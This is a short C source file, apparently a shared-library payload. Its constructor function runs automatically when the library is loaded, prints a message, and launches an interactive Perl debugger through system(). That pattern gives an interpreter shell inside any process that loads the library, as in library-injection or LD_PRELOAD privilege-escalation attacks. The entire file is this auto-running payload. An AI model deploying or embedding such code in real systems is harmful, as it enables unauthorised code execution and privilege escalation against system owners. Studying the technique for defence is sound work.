#include <stdio.h>
#include <stdlib.h>

void __attribute__((constructor)) call_pl()
{
  printf("DLL function 'call_pl' was called\n");
  system("/usr/bin/perl -de 1");
}